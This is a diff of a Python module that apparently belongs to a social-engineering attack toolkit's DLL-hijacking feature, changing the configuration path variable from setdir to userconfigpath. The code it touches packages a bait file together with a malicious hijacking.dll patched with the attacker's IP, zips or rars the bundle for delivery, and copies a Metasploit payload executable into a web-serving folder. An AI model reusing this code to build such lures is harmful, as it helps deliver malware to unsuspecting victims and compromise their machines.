@@ -60,7 +60,7 @@ for line in fileopen:
 print("\n   [*] You have selected the file extension of %s and vulnerable dll of %s" % (extension, dll))
 
 # prep the directories
-subprocess.Popen("mkdir " + setdir + "/dll", stdout=subprocess.PIPE,
+subprocess.Popen("mkdir " + userconfigpath + "dll", stdout=subprocess.PIPE,
                  stderr=subprocess.PIPE, shell=True).wait()
 filename1 = input(setprompt(
     ["2", "15"], "Enter the filename for the attack (example:openthis) [openthis]"))
@@ -68,7 +68,7 @@ if filename1 == "":
     filename1 = "openthis"
 
 # move the files there using the correct extension and file type
-filewrite = open(setdir + "/dll/%s%s" % (filename1, extension), "w")
+filewrite = open(userconfigpath + "dll/%s%s" % (filename1, extension), "w")
 filewrite.write("EMPTY")
 filewrite.close()
 
@@ -82,7 +82,7 @@ else:
 fileopen = open("src/webattack/dll_hijacking/hijacking.dll", "rb")
 data = fileopen.read()
 
-filewrite = open(setdir + "/dll/%s" % (dll), "wb")
+filewrite = open(userconfigpath + "dll/%s" % (dll), "wb")
 
 host = int(len(ipaddr) + 1) * "X"
 
@@ -127,7 +127,7 @@ if choice == "1":
     # we get a hit?
     if match:
         subprocess.Popen("cd %s/dll;rar a %s/template.rar * 1> /dev/null 2> /dev/null" %
-                         (setdir, setdir), shell=True).wait()
+                         (userconfigpath, userconfigpath), shell=True).wait()
         counter = 1
 
     # if we didnt find rar
@@ -139,11 +139,11 @@ if choice == "1":
 # if its a zipfile zip the badboy up
 if choice == "2":
     # write to a zipfile here
-    file = zipfile.ZipFile(setdir + "/template.zip", "w")
-    for name in glob.glob(setdir + "/dll/*"):
+    file = zipfile.ZipFile(userconfigpath + "template.zip", "w")
+    for name in glob.glob(userconfigpath + "dll/*"):
         file.write(name, os.path.basename(name), zipfile.ZIP_DEFLATED)
     file.close()
 
-if os.path.isfile(setdir + "/msf.exe"):
+if os.path.isfile(userconfigpath + "msf.exe"):
     subprocess.Popen("cp %s/msf.exe %s/src/html/" %
-                     (setdir, definepath), shell=True).wait()
+                     (userconfigpath, definepath), shell=True).wait()
